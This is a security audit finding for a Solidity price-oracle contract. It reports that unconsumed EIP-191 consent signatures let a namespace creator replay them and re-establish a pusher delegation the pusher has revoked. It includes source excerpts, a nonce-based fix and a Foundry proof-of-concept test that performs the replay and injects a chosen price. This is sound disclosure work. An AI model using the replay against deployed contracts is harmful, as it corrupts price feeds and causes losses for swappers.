### Title
Pusher Consent Signature Replay in `allowPushers` Lets Creator Re-establish Revoked Delegation, Misdirecting Oracle Feed Writes — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1.allowPushers` verifies a pusher's EIP-191 consent signature but never marks it as consumed. A creator who holds a pusher's previously-issued signature can replay it — within the deadline window — to silently re-establish delegation after the pusher has called `revokePusher()`. The pusher's subsequent `fallback()` price pushes then land in the creator's namespace without the pusher's knowledge or consent, corrupting oracle feed data that downstream price providers and pools consume.

---

### Finding Description

`allowPushers` binds the pusher's consent to `(chainid, oracle_address, deadline, pusher, creator)` and enforces only that `block.timestamp <= deadline`: [1](#0-0) 

There is no nonce, no used-signature bitmap, and no check that `namespaceRemapping[pusher]` is currently `address(0)` before overwriting it. The code comment itself acknowledges the gap: [2](#0-1) 

`_ensureDeadline` only checks `block.timestamp <= deadline` — it does not invalidate the signature: [3](#0-2) 

`revokePusher` clears the mapping but cannot prevent the creator from replaying the old signature: [4](#0-3) 

The `fallback()` push path resolves the namespace from `namespaceRemapping[msg.sender]` at call time, so any re-established mapping immediately redirects all future pushes: [5](#0-4) 

---

### Impact Explanation

Once the creator replays the signature:

1. The pusher's `fallback()` writes land in the **creator's** namespace instead of the pusher's own.
2. If the pusher has since been re-delegated to a **different creator (B)**, those pushes are silently hijacked to creator A's namespace — creator B's feeds receive no updates (starvation) while creator A's feeds receive data intended for creator B (wrong prices).
3. Price providers (`AnchoredPriceProvider`, `PriceProvider`) read from these feeds via `oracle.price(feedId, pool)` and pass the result directly into pool swap math: [6](#0-5) 

4. Corrupted or stale feed data that passes the staleness/spread/guard checks reaches `_computeBidAsk` and is returned as the live bid/ask to the pool, causing bad-price execution for swappers.

---

### Likelihood Explanation

- The creator already holds the pusher's signature (they submitted it in the original `allowPushers` call).
- Deadlines are typically set days in the future (the test suite uses `block.timestamp + 1 days`), giving a wide replay window.
- The creator is not a trusted oracle admin — this is an unprivileged path available to any namespace owner.
- The pusher has no on-chain way to detect or prevent the replay short of calling `revokePusher()` in the same block as the creator's replay, which is a race condition.

---

### Recommendation

Track consumed signatures with a per-pusher nonce or a `usedSignatures` mapping. The simplest fix is to include a per-pusher nonce in the signed digest and increment it on every successful `allowPushers` or `revokePusher` call:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers, include nonce in the digest:
keccak256(abi.encode(block.chainid, address(this), deadline, pusherNonce[pusher], pusher, msg.sender))

// In revokePusher, increment nonce to invalidate all prior signatures:
pusherNonce[msg.sender]++;
namespaceRemapping[msg.sender] = address(0);
```

Alternatively, reject `allowPushers` if `namespaceRemapping[pusher] != address(0)` (require explicit removal before re-delegation), forcing the creator to go through `removePushers` first — which the pusher can monitor on-chain.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

// Demonstrates that a creator can replay a pusher's old consent signature
// to re-establish delegation after the pusher has revoked it.

function testReplayAfterRevoke() public {
    uint256 deadline = block.timestamp + 1 days;

    // Pusher signs consent once
    bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // Step 1: Creator delegates pusher
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator, "delegated");

    // Step 2: Pusher revokes — intends to stop pushing to creator's namespace
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

    // Step 3: Creator replays the SAME signature (deadline still valid)
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs); // no revert — replay succeeds
    assertEq(oracle.namespaceRemapping(pusher), creator, "re-delegated without pusher consent");

    // Step 4: Pusher's next price push lands in creator's namespace, not pusher's own
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 raw = _packRaw(9_000_000, 3, 3); // attacker-chosen price
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
    assertTrue(ok);

    // Creator's feed now contains the pusher's data — wrong price for any pool reading it
    IOffchainOracle.OracleData memory data = oracle.getOracleData(oracle.feedIdOf(creator, 0, 0));
    assertEq(data.price, U64x32.decode(uint32(raw >> 16)), "creator feed corrupted");
}
``` [7](#0-6) [4](#0-3)

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-212)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-321)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;

        assembly ("memory-safe") {
            end := calldatasize()
            namespace := shl(96, creator) // [creator:20][zeros:12]
        }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/OracleBase.sol (L124-126)
```text
    function _ensureDeadline(uint256 deadline) internal view virtual {
        require(block.timestamp <= deadline, DeadlineExceeded());
    }
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L277-295)
```text
    function _readLeg(bytes32 feedId)
        internal returns (uint256 mid, uint256 spreadBps, uint256 refTime, bool ok)
    {
        (mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);

        // Stale reference → not ok. Clamping to a stale anchor is the one false-safety case.
        if (_isStale(refTime, block.timestamp, MAX_REF_STALENESS)) return (mid, spreadBps, refTime, false);

        // Basic validity — mid positive, spreadBps not the stalled/off-hours marker (the Chainlink oracle
        // writes spreadBps = ORACLE_BPS when an RWA market is closed).
        if (mid == 0 || spreadBps >= ORACLE_BPS) return (mid, spreadBps, refTime, false);

        // Per-leg price guard.
        (uint128 guardMin, uint128 guardMax) = offchainOracle.priceGuard(feedId);
        guardMax = guardMax == 0 ? type(uint128).max : guardMax;
        if (mid < guardMin || mid > guardMax) return (mid, spreadBps, refTime, false);

        ok = true;
    }
```
